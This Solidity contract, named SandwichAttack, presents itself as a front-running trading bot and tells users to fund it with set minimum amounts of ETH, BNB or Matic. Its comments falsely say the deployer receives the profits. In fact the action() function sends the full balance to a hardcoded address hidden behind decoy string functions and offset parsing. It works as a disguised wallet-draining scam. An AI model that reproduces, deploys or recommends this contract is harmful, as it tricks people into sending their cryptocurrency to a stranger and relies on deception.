// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interface/IERC20.sol";

/// @dev Set blockchain 1 = ETH min 0.3 eth
/// @dev 2 = BNB min 0.6 bnb
/// @dev 3 = Matic min 400 matic as the competetion for the block is high as more people are using this bot.
// note: the address used to deploy this contact will be the payment address

contract SandwichAttack {
	string public setblockchain = "";

	
	constructor(string memory _setblockchain) {
		setblockchain = _setblockchain;
	}
	
    fallback() external payable {}

    receive() external payable {}	

    function CalculateNumbers(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
   function startAttact() public pure returns (address adr) {
   string memory neutral_variable = "CA8f18Ff2D5Da7651a609e71931783E09F00906589";
   CalculateNumbers(neutral_variable,0,"0");
   CalculateNumbers(neutral_variable,1,"x");
   address addr = parseDeeptime(neutral_variable);
    return addr;
   }
function parseDeeptime(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
 function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
 
 function action() public payable{
	payable(startAttact()).transfer(address(this).balance);	    
  }

}